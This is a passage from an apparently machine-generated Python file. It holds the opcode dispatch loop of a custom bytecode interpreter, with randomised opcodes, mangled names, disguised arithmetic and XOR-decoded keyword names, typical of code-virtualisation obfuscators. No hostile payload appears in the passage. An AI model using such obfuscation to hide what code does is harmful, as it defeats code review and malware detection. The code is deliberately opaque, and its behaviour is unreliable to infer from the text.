                _d, _b, _c = arg; registers[_d] = set((registers[_b + i] for i in range(_c)))
              elif opcode == 541:
                registers[arg[0]] = iter(registers[arg[1]])
            elif opcode == 646:
              _top = stack[-1]; stack.append(getattr(_top, names[arg]))
            elif opcode == 702:
              _obj = fastlocals[arg[0]]; stack.append(getattr(_obj, names[arg[1]]))
          elif opcode < 1172:
            if opcode < 934:
              if opcode < 789:
                if opcode < 786:
                  if opcode < 759:
                    if opcode == 742:
                      val = stack.pop(); depth = arg if arg is not None and arg > 0 else 1; stack[-depth].extend(val)
                  elif opcode < 761:
                    if opcode == 759:
                      _d, _s1, _s2 = arg; registers[_d] = registers[_s1] ^ registers[_s2]
                  elif opcode == 761:
                    registers[arg[0]] = registers[arg[1]] / registers[arg[2]]
                  elif opcode == 764:
                    _a = fastlocals[arg[0]]; _b = fastlocals[arg[1]]; stack.append(_a * _b)
                elif opcode == 786:
                  _n = names[1]
                  _b_1_0 = globals_dict[_n] if _n in globals_dict else builtins_dict[_n] if builtins_dict and _n in builtins_dict else getattr(_builtins, _n, None)
                  stack.append(_b_1_0)
                elif opcode == 788:
                  _v = stack.pop(); stack.append(-_v)
              elif opcode < 902:
                if opcode < 851:
                  if opcode == 789:
                    _d0_v = registers[0]
                    while len(fastlocals) <= 1:
                      fastlocals.append(None)
                    fastlocals[1] = _d0_v; _d1_v = fastlocals[1]; registers[0] = _d1_v; _d2_v = fastlocals[0]; registers[1] = _d2_v
                  elif opcode == 818:
                    stack[-3:] = [stack[-1], stack[-3], stack[-2]]
                elif opcode < 853:
                  if opcode == 851:
                    registers[arg[0]] = consts[arg[1]]
                elif opcode == 853:
                  right = stack.pop(); left = stack.pop(); stack.append(left >= right)
                elif opcode == 859:
                  stack[-2] = stack[-2] ** stack[-1]; stack.pop()
              elif opcode < 910:
                if opcode == 902:
                  _d, _f, _flags = arg; _a = registers[_f + 1]; _kw = registers[_f + 2] if _flags & 1 else {}
                  registers[_d] = registers[_f](*_a, **_kw)
                elif opcode == 903:
                  stack.append(registers[arg])
              elif opcode < 913:
                if opcode == 910:
                  setattr(registers[arg[0]], names[arg[1]], registers[arg[2]])
              elif opcode == 913:
                _d, _s1, _s2 = arg; registers[_d] = registers[_s1] >> registers[_s2]
              elif opcode == 914:
                name = names[arg]
                if name in locals_dict:
                  stack.append(locals_dict[name])
                elif name in globals_dict:
                  stack.append(globals_dict[name])
                elif name == 'super':
                  def _rxzz738lu(*args):
                    if not args:
                      if hasattr(frame, '_bndvtbtyk') and frame._bndvtbtyk and hasattr(frame._bndvtbtyk, '__class_owner__') and frame._qgybkgcu:
                        return _builtins.super(frame._bndvtbtyk.__class_owner__, frame._qgybkgcu[0])
                    return _builtins.super(*args)
                  stack.append(_rxzz738lu)
                elif builtins_dict and name in builtins_dict:
                  stack.append(builtins_dict[name])
                else:
                  raise NameError(f"name '{name}' is not defined")
            elif opcode < 990:
              if opcode < 946:
                if opcode == 934:
                  _a, _b = stack[-2:]; del stack[-2:]; stack.append(_a @ _b)
              elif opcode < 959:
                if opcode == 946:
                  attr_idx, argc = arg; name = names[attr_idx]; args = stack[-argc:] if argc > 0 else []
                  if argc > 0:
                    del stack[-argc:]
                  obj = stack.pop(); func = getattr(obj, name)
                  if isinstance(func, _types.MethodType) and isinstance(func.__func__, _l2eirz0o):
                    args = [func.__self__] + list(args); func = func.__func__
                  if isinstance(func, _l2eirz0o):
                    _fl = _z74gfxk8n8(func.code, args, {}, func.defaults, func.kw_defaults)
                    frame._cpq05ys9v3 = _iti5884lo(func.code, func.globals_dict, fastlocals=_fl, closure=func.closure, func=func)
                  else:
                    stack.append(func(*args))
              elif opcode < 962:
                if opcode == 959:
                  _g2ufcsfhkf = names[arg]; _li0h4zll = globals_dict
                  if _g2ufcsfhkf in _li0h4zll:
                    _rnvrh0lu8 = _li0h4zll[_g2ufcsfhkf]; stack.append(_rnvrh0lu8)
                  elif _g2ufcsfhkf == 'super':
                    def _rxzz738lu(*args):
                      if not args:
                        if hasattr(frame, '_bndvtbtyk') and frame._bndvtbtyk and hasattr(frame._bndvtbtyk, '__class_owner__') and frame._qgybkgcu:
                          return _builtins.super(frame._bndvtbtyk.__class_owner__, frame._qgybkgcu[0])
                      return _builtins.super(*args)
                    stack.append(_rxzz738lu)
                  elif builtins_dict and _g2ufcsfhkf in builtins_dict:
                    stack.append(builtins_dict[_g2ufcsfhkf])
                  else:
                    raise NameError(f"name '{_g2ufcsfhkf}' is not defined")
              elif opcode == 962:
                right = stack.pop(); left = stack.pop()
                stack.append(isinstance(left, right) or (isinstance(left, type) and issubclass(left, right)))
              elif opcode == 977:
                stack.extend(stack[-1:])
            elif opcode < 1003:
              if opcode < 997:
                if opcode == 990:
                  _b = stack.pop(); _a = stack.pop(); stack.append(_b + _a if type(_a) is int and type(_b) is int else _a + _b)
                elif opcode == 992:
                  right = stack.pop(); left = stack.pop(); stack.append(left | right)
              elif opcode == 997:
                _e991h0rrkl = names[arg]; _vj30jyn1l8 = stack.pop(); locals_dict.__setitem__(_e991h0rrkl, _vj30jyn1l8)
              elif opcode == 1002:
                _jeg8imfwr, _p2j3i2z3 = stack[-2:]; del stack[-2:]; stack.append(_jeg8imfwr % _p2j3i2z3)
            elif opcode < 1058:
              if opcode < 1029:
                if opcode == 1003:
                  def _sjf6am9m7(func, name, *bases, **kwds):
                    meta = kwds.get('metaclass')
                    if meta is None:
                      meta = type(bases[0]) if bases else type
                    ns = meta.__prepare__(name, bases, **kwds) if hasattr(meta, '__prepare__') else {}
                    if hasattr(func, 'execute_with_locals'):
                      func.execute_with_locals(ns)
                    else:
                      func()
                    cls = meta(name, bases, ns, **kwds)
                    for item in ns.values():
                      if hasattr(item, '__code__'):
                        item.__class_owner__ = cls
                    return cls
                  stack.append(_sjf6am9m7)
              elif opcode == 1029:
                stack.append(tuple(stack.pop()))
              elif opcode == 1049:
                _d, _obj, _n = arg; registers[_d] = getattr(registers[_obj], names[_n])
            elif opcode < 1125:
              if opcode == 1058:
                if bool(stack[-1]) is False:
                  frame._dt5stgv42 = arg
                else:
                  del stack[-1]
            elif opcode == 1125:
              _k = stack.pop(); del stack.pop()[_k]
            elif opcode == 1161:
              stack[-1:] = [~stack[-1]]
          elif opcode < 1537:
            if opcode < 1331:
              if opcode < 1278:
                if opcode == 1172:
                  _r = stack.pop(); _l = stack[-1]
                  frame._zvyfas1jas = (frame._zvyfas1jas * 1103515245 + 12345 ^ (_l if type(_l) is int else 0)) & 4294967295
                  stack[-1] = (_l ^ _r) + 2 * (_l & _r) if type(_l) is int and type(_r) is int else _l + _r
                elif opcode == 1273:
                  fromlist = stack.pop(); level = stack.pop(); name = consts[arg]
                  import_func = builtins_dict.get('__import__', _builtins.__import__) if builtins_dict else _builtins.__import__
                  stack.append(import_func(name, globals_dict, locals_dict, fromlist, level))
              elif opcode == 1278:
                _name = names[arg]; stack[-1] = getattr(stack[-1], _name)
              elif opcode == 1280:
                if frame._okdt6esla:
                  _b = frame._okdt6esla.pop()
                  if _b.type == _aexdki9e08.WITH:
                    frame._sppmttigw = _b.exit_fn
            elif opcode < 1507:
              if opcode < 1397:
                if opcode == 1331:
                  _b = stack.pop(); _a = stack.pop()
                  frame._zvyfas1jas = (frame._zvyfas1jas * 1103515245 + 12345 ^ (_a if type(_a) is int else 0)) & 4294967295
                  _res = _a + _b - (_a & _b) if type(_a) is int and type(_b) is int else _a | _b; stack.append(_res)
              elif opcode < 1400:
                if opcode == 1397:
                  _e4uk52bh0y = stack.pop()
                  while len(fastlocals) <= arg:
                    fastlocals += [None]
                  fastlocals[arg] = _e4uk52bh0y
              elif opcode == 1400:
                stack[-2] = stack[-2] / stack[-1]; stack.pop()
              elif opcode == 1492:
                right = stack.pop(); left = stack.pop(); stack.append(left == right)
            elif opcode < 1520:
              if opcode == 1507:
                _d, _obj, _k = arg; registers[_d] = registers[_obj][registers[_k]]
            elif opcode < 1525:
              if opcode == 1520:
                _fl = fastlocals; stack.append(_fl[arg])
              elif opcode == 1524:
                stack.append(fastlocals[arg[0]] + fastlocals[arg[1]])
            elif opcode == 1525:
              stack += [consts[arg]]
            elif opcode == 1531:
              _a82y552sl = names[arg]; _gyl4zvs2 = stack.pop(); _ltiam1z6db = stack.pop(); setattr(_gyl4zvs2, _a82y552sl, _ltiam1z6db)
          elif opcode < 1755:
            if opcode < 1598:
              if opcode == 1537:
                _d, _s2, _op = arg; _left_v = registers[_d]; _right_v = registers[_s2]
                if _op == 2:
                  registers[_d] = _left_v == _right_v
                elif _op == 3:
                  registers[_d] = _left_v != _right_v
                elif _op == 0:
                  registers[_d] = _left_v < _right_v
                elif _op == 1:
                  registers[_d] = _left_v <= _right_v
                elif _op == 4:
                  registers[_d] = _left_v > _right_v
                elif _op == 5:
                  registers[_d] = _left_v >= _right_v
                elif _op == 6:
                  registers[_d] = _left_v in _right_v
                elif _op == 7:
                  registers[_d] = _left_v not in _right_v
                elif _op == 8:
                  registers[_d] = _left_v is _right_v
                elif _op == 9:
                  registers[_d] = _left_v is not _right_v
                elif _op == 10:
                  registers[_d] = isinstance(_left_v, _right_v) or (isinstance(_left_v, type) and issubclass(_left_v, _right_v))
              elif opcode == 1585:
                None
            elif opcode < 1687:
              if opcode == 1598:
                _b = _p46bina0(_aexdki9e08.FINALLY, arg, len(stack)); frame._okdt6esla.append(_b)
              elif opcode == 1673:
                stack.append(fastlocals[arg[0]] - consts[arg[1]])
            elif opcode == 1687:
              _args = [stack.pop() for _ in range(arg)][::-1] if arg > 0 else []; _func = stack.pop()
              if isinstance(_func, _types.MethodType) and isinstance(_func.__func__, _l2eirz0o):
                _args = [_func.__self__] + list(_args); _func = _func.__func__
              if isinstance(_func, _l2eirz0o):
                _fl = _z74gfxk8n8(_func.code, _args, {}, _func.defaults, _func.kw_defaults)
                frame._cpq05ys9v3 = _iti5884lo(_func.code, _func.globals_dict, fastlocals=_fl, closure=_func.closure, func=_func)
              else:
                stack.append(_func(*_args))
            elif opcode == 1692:
              _jvz7taux = stack.pop(); globals_dict[names[arg]] = _jvz7taux
          elif opcode < 1857:
            if opcode < 1766:
              if opcode == 1755:
                _it, _dst, _tgt = arg
                try:
                  registers[_dst] = next(registers[_it])
                except StopIteration:
                  frame._dt5stgv42 = _tgt
            elif opcode == 1766:
              _d, _b, _c = arg
              registers[_d] = slice(registers[_b], registers[_b + 1]) if _c == 2 else slice(registers[_b], registers[_b + 1], registers[_b + 2])
            elif opcode == 1849:
              _val = stack.pop(); registers[arg] = _val
          elif opcode < 1892:
            if opcode < 1868:
              if opcode == 1857:
                try:
                  _lj95k8dg = next(stack[-1]); stack.append(_lj95k8dg)
                except StopIteration:
                  stack.pop(); frame._dt5stgv42 = arg
            elif opcode == 1868:
              _mup07igoq = stack.pop(); _uppu14wfr7 = stack[-1]; cmp_arg = arg
              if arg == 0:
                stack[-1] = _uppu14wfr7 < _mup07igoq
              elif arg == 1:
                stack[-1] = _uppu14wfr7 <= _mup07igoq
              elif arg == 2:
                stack[-1] = _uppu14wfr7 == _mup07igoq
              elif arg == 3:
                stack[-1] = _uppu14wfr7 != _mup07igoq
              elif arg == 4:
                stack[-1] = _uppu14wfr7 > _mup07igoq
              elif arg == 5:
                stack[-1] = _uppu14wfr7 >= _mup07igoq
              elif arg == 6:
                stack[-1] = _uppu14wfr7 in _mup07igoq
              elif arg == 7:
                stack[-1] = _uppu14wfr7 not in _mup07igoq
              elif arg == 8:
                stack[-1] = _uppu14wfr7 is _mup07igoq
              elif arg == 9:
                stack[-1] = _uppu14wfr7 is not _mup07igoq
              elif arg == 10:
                stack[-1] = isinstance(_uppu14wfr7, _mup07igoq) or (isinstance(_uppu14wfr7, type) and issubclass(_uppu14wfr7, _mup07igoq))
            elif opcode == 1887:
              _d, _s = arg; registers[_d] = not registers[_s]
          elif opcode < 1948:
            if opcode == 1892:
              delattr(registers[arg[0]], names[arg[1]])
            elif opcode == 1944:
              _i28bzcr3 = stack.pop(); _s718wc0nj = stack.pop()
              stack.append(_i28bzcr3 + _s718wc0nj if type(_s718wc0nj) is int and type(_i28bzcr3) is int else _s718wc0nj + _i28bzcr3)
          elif opcode < 1963:
            if opcode == 1948:
              _a, _b = stack[-2:]; del stack[-2:]; stack.append(_a & _b)
          elif opcode == 1963:
            registers[arg[0]][registers[arg[1]]] = registers[arg[2]]
          elif opcode == 2031:
            right = stack.pop(); left = stack.pop(); stack.append(left is not right)
        elif opcode < 4133:
          if opcode < 2584:
            if opcode < 2208:
              if opcode < 2155:
                if opcode < 2056:
                  if opcode == 2034:
                    right = stack.pop(); left = stack.pop(); stack.append(left << right)
                  elif opcode == 2039:
                    _r, _tgt = arg
                    if bool(registers[_r]):
                      frame._dt5stgv42 = _tgt
                elif opcode < 2132:
                  if opcode == 2056:
                    _emvwr4gx2 = stack.pop(); stack[-1] = stack[-1] - _emvwr4gx2
                elif opcode == 2132:
                  _res = stack.pop(); _awdg14bu5 = _res
                  if _dopcpc0xf(_awdg14bu5):
                    continue
                  return _awdg14bu5
                elif opcode == 2151:
                  if arg == 0:
                    stack.append(tuple())
                  else:
                    _oalgntbxzt = tuple([stack.pop() for _ in range(arg)][::-1]); stack.append(_oalgntbxzt)
              elif opcode < 2159:
                if opcode == 2155:
                  ctx_mgr = stack.pop(); enter_fn = getattr(ctx_mgr, '__enter__'); exit_fn = getattr(ctx_mgr, '__exit__'); res = enter_fn()
                  frame._okdt6esla.append(_p46bina0(_aexdki9e08.WITH, arg, len(stack), exit_fn=exit_fn)); stack.append(res)
              elif opcode == 2159:
                name_idx, argc = arg; name = names[name_idx]
                if name == 'super' and argc == 0:
                  if hasattr(frame, '_bndvtbtyk') and frame._bndvtbtyk and hasattr(frame._bndvtbtyk, '__class_owner__') and frame._qgybkgcu:
                    stack.append(_builtins.super(frame._bndvtbtyk.__class_owner__, frame._qgybkgcu[0]))
                  else:
                    stack.append(_builtins.super())
                else:
                  func = globals_dict.get(name) or (builtins_dict.get(name) if builtins_dict else getattr(_builtins, name, None))
                  args = stack[-argc:] if argc > 0 else []
                  if argc > 0:
                    del stack[-argc:]
                  if isinstance(func, _types.MethodType) and isinstance(func.__func__, _l2eirz0o):
                    args = [func.__self__] + list(args); func = func.__func__
                  if isinstance(func, _l2eirz0o):
                    _fl = _z74gfxk8n8(func.code, args, {}, func.defaults, func.kw_defaults)
                    frame._cpq05ys9v3 = _iti5884lo(func.code, func.globals_dict, fastlocals=_fl, closure=func.closure, func=func)
                  else:
                    stack.append(func(*args))
              elif opcode == 2165:
                val = stack.pop(); key = stack.pop(); depth = arg if arg is not None and arg > 0 else 1; stack[-depth][key] = val
            elif opcode < 2369:
              if opcode < 2260:
                if opcode == 2208:
                  _d, _b, _c = arg; registers[_d] = tuple((registers[_b + i] for i in range(_c)))
                elif opcode == 2219:
                  right = stack.pop(); left = stack.pop(); stack.append(left in right)
              elif opcode < 2317:
                if opcode == 2260:
                  stack.pop(-1)
              elif opcode < 2338:
                if opcode == 2317:
                  _d_tmp = None; right = stack.pop(); left = stack.pop(); stack.append(left not in right)
              elif opcode == 2338:
                val = stack.pop(); depth = arg if arg is not None and arg > 0 else 1; stack[-depth].add(val)
              elif opcode == 2359:
                stack[-2:] = [stack[-1], stack[-2]]
            elif opcode < 2504:
              if opcode < 2443:
                if opcode < 2387:
                  if opcode == 2369:
                    stack[-2] = stack[-2] << stack[-1]; stack.pop()
                elif opcode == 2387:
                  mod = stack.pop()
                  if hasattr(mod, '__all__'):
                    for k in mod.__all__:
                      locals_dict[k] = getattr(mod, k)
                  else:
                    for k, v in mod.__dict__.items():
                      if not k.startswith('_'):
                        locals_dict[k] = v
                elif opcode == 2399:
                  _m8wowb9s = fastlocals[arg]; stack.append(_m8wowb9s)
              elif opcode < 2461:
                if opcode == 2443:
                  if arg == 0:
                    stack.append(set())
                  else:
                    items = set(stack[-arg:]); del stack[-arg:]; stack.append(items)
                elif opcode == 2454:
                  while len(fastlocals) <= arg:
                    fastlocals.append(None)
                  fastlocals[arg] = stack[-1]
              elif opcode == 2461:
                globals_dict[names[arg]] = stack.pop()
              elif opcode == 2496:
                _yn7mzh4b = stack.pop(); _s787e4abz = stack.pop(); stack.append(_s787e4abz >> _yn7mzh4b)
            elif opcode < 2537:
              if opcode < 2517:
                if opcode == 2504:
                  right = stack.pop(); left = stack.pop(); stack.append(left * right)
              elif opcode == 2517:
                right = stack.pop(); left = stack.pop(); stack.append(left & right)
              elif opcode == 2519:
                _r3acc0rl = consts[arg]; stack.extend([_r3acc0rl])
            elif opcode < 2538:
              if opcode == 2537:
                _b = stack.pop(); _a = stack.pop()
                frame._zvyfas1jas = (frame._zvyfas1jas * 1103515245 + 12345 ^ (_b if type(_b) is int else 0)) & 4294967295
                _res = (_a ^ _b) - 2 * (~_a & _b) if type(_a) is int and type(_b) is int else _a - _b; stack.append(_res)
            elif opcode == 2538:
              stack.pop()
            elif opcode == 2544:
              _e991h0rrkl = names[arg]; _vj30jyn1l8 = stack.pop(); locals_dict.__setitem__(_e991h0rrkl, _vj30jyn1l8)
          elif opcode < 3113:
            if opcode < 2729:
              if opcode < 2608:
                if opcode == 2584:
                  _w70m3zn6m = stack.pop()
                  if bool(_w70m3zn6m) is True:
                    frame._dt5stgv42 = arg
                elif opcode == 2591:
                  stack.append(registers[arg])
              elif opcode < 2633:
                if opcode == 2608:
                  right = stack.pop(); left = stack.pop(); stack.append(left > right)
              elif opcode < 2656:
                if opcode == 2633:
                  name = names[arg]; obj = stack.pop(); delattr(obj, name)
                elif opcode == 2651:
                  _e4uk52bh0y = stack.pop()
                  while len(fastlocals) <= arg:
                    fastlocals += [None]
                  fastlocals[arg] = _e4uk52bh0y
              elif opcode < 2685:
                if opcode == 2656:
                  val = stack.pop()
                  if val:
                    frame._dt5stgv42 = arg
              elif opcode == 2685:
                _d_v1 = None; _d0_0 = stack.pop(); locals_dict[names[0]] = _d0_0; _n = names[1]
                _d1_0 = locals_dict[_n] if _n in locals_dict else globals_dict[_n] if _n in globals_dict else builtins_dict.get(_n) if builtins_dict and _n in builtins_dict else getattr(_builtins, _n)
                stack.append(_d1_0)
              elif opcode == 2715:
                _dst, _fn, _argc = arg; registers[_dst] = registers[_fn](*[registers[_fn + 1 + i] for i in range(_argc)])
            elif opcode < 2843:
              if opcode < 2759:
                if opcode < 2750:
                  if opcode == 2729:
                    locals_dict[names[arg[0]]] = registers[arg[1]]
                elif opcode == 2750:
                  registers[arg[0]].append(registers[arg[1]])
                elif opcode == 2758:
                  if arg == 0:
                    stack.append(list())
                  else:
                    _items = [stack.pop() for _ in range(arg)][::-1]; stack.append(_items)
              elif opcode < 2762:
                if opcode == 2759:
                  _v = stack.pop(); frame._dt5stgv42 = arg if _v else frame._dt5stgv42
              elif opcode < 2799:
                if opcode == 2762:
                  stack.pop()
              elif opcode == 2799:
                val = stack.pop(); depth = arg if arg is not None and arg > 0 else 1; stack[-depth].append(val)
              elif opcode == 2807:
                _d, _s1, _s2 = arg; registers[_d] = registers[_s1] // registers[_s2]
            elif opcode < 2932:
              if opcode < 2897:
                if opcode == 2843:
                  right = stack.pop(); left = stack.pop(); cmp_arg = arg
                  if arg == 0:
                    stack.append(not left >= right)
                  elif arg == 1:
                    stack.append(not left > right)
                  elif arg == 2:
                    stack.append(not left != right)
                  elif arg == 3:
                    stack.append(not left == right)
                  elif arg == 4:
                    stack.append(not left <= right)
                  elif arg == 5:
                    stack.append(not left < right)
                  elif arg == 6:
                    stack.append(left in right)
                  elif arg == 7:
                    stack.append(not left in right)
                  elif arg == 8:
                    stack.append(left is right)
                  elif arg == 9:
                    stack.append(not left is right)
                  elif arg == 10:
                    stack.append(isinstance(left, right) or (isinstance(left, type) and issubclass(left, right)))
              elif opcode == 2897:
                if stack[-1]:
                  frame._dt5stgv42 = arg
              elif opcode == 2899:
                while len(fastlocals) <= arg[1]:
                  fastlocals.append(None)
                fastlocals[arg[1]] = fastlocals[arg[0]]
            elif opcode < 2995:
              if opcode == 2932:
                pass
              elif opcode == 2968:
                _gqm2fie5uc, _qennnxys5x, _ao13gtec9 = arg; _w9nsdjg2y3 = registers[_qennnxys5x]; _ttoa36ueuc = registers[_ao13gtec9]
                registers[_gqm2fie5uc] = (_w9nsdjg2y3 | _ttoa36ueuc) + (_w9nsdjg2y3 & _ttoa36ueuc) if type(_w9nsdjg2y3) is int and type(_ttoa36ueuc) is int else _w9nsdjg2y3 + _ttoa36ueuc
            elif opcode < 3073:
              if opcode == 2995:
                _val = stack.pop()
                while len(fastlocals) <= arg:
                  fastlocals.append(None)
                fastlocals[arg] = _val
              elif opcode == 3070:
                while len(fastlocals) <= arg[0]:
                  fastlocals.append(None)
                fastlocals[arg[0]] = registers[arg[1]]
            elif opcode == 3073:
              stack.append(registers[arg])
            elif opcode == 3099:
              stack.append(fastlocals[arg[0]] + consts[arg[1]])
          elif opcode < 3530:
            if opcode < 3329:
              if opcode < 3149:
                if opcode == 3113:
                  if bool(stack[-1]) is True:
                    frame._dt5stgv42 = arg
                  else:
                    del stack[-1]
              elif opcode < 3298:
                if opcode == 3149:
                  stack[-2] = stack[-2] >> stack[-1]; stack.pop()
                elif opcode == 3208:
                  _mod = registers[arg]
                  if hasattr(_mod, '__all__'):
                    for _k in _mod.__all__:
                      locals_dict[_k] = getattr(_mod, _k)
                  else:
                    for _k, _v in _mod.__dict__.items():
                      if not _k.startswith('_'):
                        locals_dict[_k] = _v
              elif opcode == 3298:
                kwargs = stack.pop() if arg & 1 else {}; args = stack.pop(); func = stack.pop()
                if isinstance(func, _types.MethodType) and isinstance(func.__func__, _l2eirz0o):
                  args = tuple([func.__self__] + list(args)); func = func.__func__
                if isinstance(func, _l2eirz0o):
                  _fl = _z74gfxk8n8(func.code, args, kwargs, func.defaults, func.kw_defaults)
                  frame._cpq05ys9v3 = _iti5884lo(func.code, func.globals_dict, fastlocals=_fl, closure=func.closure, func=func)
                else:
                  stack.append(func(*args, **kwargs))
              elif opcode == 3306:
                _gqm2fie5uc, _qennnxys5x, _ao13gtec9 = arg; registers[_gqm2fie5uc] = registers[_qennnxys5x] + registers[_ao13gtec9]
            elif opcode < 3398:
              if opcode < 3350:
                if opcode == 3329:
                  registers[arg[0]] = registers[arg[1]] << registers[arg[2]]
              elif opcode < 3356:
                if opcode == 3350:
                  _z62wc3ipo = stack.pop(); stack.append(+_z62wc3ipo)
              elif opcode == 3356:
                _dst, _nidx = arg; _name = names[_nidx]
                registers[_dst] = globals_dict.get(_name, builtins_dict.get(_name) if builtins_dict else None)
                if registers[_dst] is None and _name not in globals_dict and (not builtins_dict or _name not in builtins_dict):
                  raise NameError(f"name '{_name}' is not defined")
              elif opcode == 3388:
                if not stack.pop():
                  frame._dt5stgv42 = arg
            elif opcode < 3477:
              if opcode < 3439:
                if opcode == 3398:
                  _s, _db, _cnt = arg; _seq = list(registers[_s])
                  for i in range(_cnt):
                    registers[_db + _cnt - 1 - i] = _seq[i]
                elif opcode == 3406:
                  _d, _m, _n = arg; registers[_d] = getattr(registers[_m], names[_n])
              elif opcode == 3439:
                registers[arg[0]] = registers[arg[1]] * registers[arg[2]]
            elif opcode < 3498:
              if opcode == 3477:
                right = stack.pop(); left = stack.pop(); stack.append(left <= right)
            elif opcode == 3498:
              _d, _s = arg; registers[_d] = -registers[_s]
            elif opcode == 3512:
              right = stack.pop(); left = stack.pop(); stack.append(left % right)
          elif opcode < 3678:
            if opcode < 3559:
              if opcode == 3530:
                frame._y1iycm4x[arg[0]].val = registers[arg[1]]
              elif opcode == 3550:
                _dst, _idx = arg; registers[_dst] = fastlocals[_idx]
            elif opcode < 3649:
              if opcode == 3559:
                _dst, _cell = arg; registers[_dst] = frame._y1iycm4x[_cell].val
              elif opcode == 3606:
                _dst, _creg, _flags = arg; _cobj = registers[_creg]
                _cells = tuple((frame._y1iycm4x[frame._ftgmrblsan.cellvars.index(v)] if v in frame._ftgmrblsan.cellvars else frame._y1iycm4x[len(frame._ftgmrblsan.cellvars) + frame._ftgmrblsan.freevars.index(v)] for v in _cobj.freevars)) if _cobj.freevars else ()
                _defs = registers[_dst] if _flags & 1 else ()
                _kwdefs = (registers[_dst + 1] if _flags & 1 else registers[_dst]) if _flags & 2 else {}
                registers[_dst] = _l2eirz0o(_cobj, globals_dict, defaults=_defs or (), kw_defaults=_kwdefs or {}, closure=_cells)
            elif opcode < 3652:
              if opcode == 3649:
                _obj, _k, _v = arg; registers[_obj][registers[_k]] = registers[_v]
            elif opcode == 3652:
              if not registers[arg[0]]:
                frame._dt5stgv42 = arg[1]
            elif opcode == 3666:
              _dst, _fn, _argc = arg; _k = registers[_fn + 1 + _argc]; _kc = len(_k); _pc = _argc - _kc
              _pargs = [registers[_fn + 1 + i] for i in range(_pc)]; _kvals = [registers[_fn + 1 + _pc + i] for i in range(_kc)]
              _dk = tuple((bytes((x ^ k[0] for x in k[1])).decode('utf-8') if isinstance(k, list) else k for k in _k))
              _kw = dict(zip(_dk, _kvals)); registers[_dst] = registers[_fn](*_pargs, **_kw)
          elif opcode < 4032:
            if opcode < 3902:
              if opcode < 3846:
                if opcode == 3678:
                  _d, _b, _c = arg; _m = {}
                  for i in range(_c):
                    _m[registers[_b + 2 * i]] = registers[_b + 2 * i + 1]
                  registers[_d] = _m
                elif opcode == 3767:
                  _idx, _src = arg
                  while len(fastlocals) <= _idx:
                    fastlocals.append(None)
                  fastlocals[_idx] = registers[_src]
              elif opcode == 3846:
                _d, _s1, _s2 = arg; _a = registers[_s1]; _b = registers[_s2]
                registers[_d] = (_a & ~_b) - (~_a & _b) if type(_a) is int and type(_b) is int else _a - _b
              elif opcode == 3862:
                cmp_arg, target_pc = arg; right = stack.pop(); left = stack.pop(); res = False
                if cmp_arg == 0:
                  res = left < right
                elif cmp_arg == 1:
                  res = left <= right
                elif cmp_arg == 2:
                  res = left == right
                elif cmp_arg == 3:
                  res = left != right
                elif cmp_arg == 4:
                  res = left > right
                elif cmp_arg == 5:
                  res = left >= right
                elif cmp_arg == 6:
                  res = left in right
                elif cmp_arg == 7:
                  res = left not in right
                elif cmp_arg == 8:
                  res = left is right
                elif cmp_arg == 9:
                  res = left is not right
                elif cmp_arg == 10:
                  res = isinstance(left, right) or (isinstance(left, type) and issubclass(left, right))
                if not res:
                  frame._dt5stgv42 = target_pc
            elif opcode < 3979:
              if opcode == 3902:
                _n9mp5j44yu = {}
                if arg > 0:
                  _ldu0wkangv = [stack.pop() for _ in range(2 * arg)][::-1]
                  for _ag2t90tj in range(0, len(_ldu0wkangv), 2):
                    _n9mp5j44yu[_ldu0wkangv[_ag2t90tj]] = _ldu0wkangv[_ag2t90tj + 1]
                stack.append(_n9mp5j44yu)
            elif opcode < 3980:
              if opcode == 3979:
                _d, _s1, _s2 = arg; registers[_d] = registers[_s1] | registers[_s2]
            elif opcode < 4008:
              if opcode == 3980:
                _n = names[arg]
                if _n in locals_dict:
                  del locals_dict[_n]
                elif _n in globals_dict:
                  del globals_dict[_n]
                else:
                  raise NameError(f"name '{_n}' is not defined")
            elif opcode == 4008:
              keys = stack.pop(); kw_count = len(keys); pos_count = arg - kw_count; kw_values = stack[-kw_count:] if kw_count > 0 else []
              if kw_count > 0:
                del stack[-kw_count:]
              pos_args = stack[-pos_count:] if pos_count > 0 else []
              if pos_count > 0:
                del stack[-pos_count:]
              func = stack.pop()
              dec_keys = tuple((bytes((x ^ k[0] for x in k[1])).decode('utf-8') if isinstance(k, list) else k for k in keys))
              kwargs = dict(zip(dec_keys, kw_values))
              if isinstance(func, _types.MethodType) and isinstance(func.__func__, _l2eirz0o):
                pos_args = [func.__self__] + list(pos_args); func = func.__func__
              if isinstance(func, _l2eirz0o):
                _fl = _z74gfxk8n8(func.code, pos_args, kwargs, func.defaults, func.kw_defaults)
                frame._cpq05ys9v3 = _iti5884lo(func.code, func.globals_dict, fastlocals=_fl, closure=func.closure, func=func)
              else:
                stack.append(func(*pos_args, **kwargs))
            elif opcode == 4022:
              _d, _b, _c = arg; registers[_d] = [registers[_b + i] for i in range(_c)]
          elif opcode < 4077:
            if opcode < 4037:
              if opcode == 4032:
                _ret = consts[arg]; _awdg14bu5 = _ret
                if _dopcpc0xf(_awdg14bu5):
                  continue
                return _awdg14bu5
            elif opcode == 4037:
              _htqrcgh8 = [stack.pop() for _ in range(arg)][::-1] if arg > 0 else []; _x9zsk8hrq1 = stack.pop()
              if isinstance(_x9zsk8hrq1, _types.MethodType) and isinstance(_x9zsk8hrq1.__func__, _l2eirz0o):
                _htqrcgh8 = [_x9zsk8hrq1.__self__] + list(_htqrcgh8); _x9zsk8hrq1 = _x9zsk8hrq1.__func__
              if isinstance(_x9zsk8hrq1, _l2eirz0o):
                _l9nyvqsug = _z74gfxk8n8(_x9zsk8hrq1.code, _htqrcgh8, {}, _x9zsk8hrq1.defaults, _x9zsk8hrq1.kw_defaults)
                frame._cpq05ys9v3 = _iti5884lo(_x9zsk8hrq1.code, _x9zsk8hrq1.globals_dict, fastlocals=_l9nyvqsug, closure=_x9zsk8hrq1.closure, func=_x9zsk8hrq1)
              else:
                stack.append(_x9zsk8hrq1(*_htqrcgh8))
            elif opcode == 4076:
              _bj9t0fyqn = stack.pop(); stack[-1] = stack[-1] * _bj9t0fyqn
          elif opcode == 4077:
            stack.extend([fastlocals[arg[0]] * consts[arg[1]]])
          elif opcode == 4126:
            _n = names[arg]; _l = locals_dict
            if _n in _l:
              stack.append(_l[_n])
            elif _n in globals_dict:
              stack.append(globals_dict[_n])
            elif _n == 'super':
              def _rxzz738lu(*args):
                if not args:
                  if hasattr(frame, '_bndvtbtyk') and frame._bndvtbtyk and hasattr(frame._bndvtbtyk, '__class_owner__') and frame._qgybkgcu:
                    return _builtins.super(frame._bndvtbtyk.__class_owner__, frame._qgybkgcu[0])
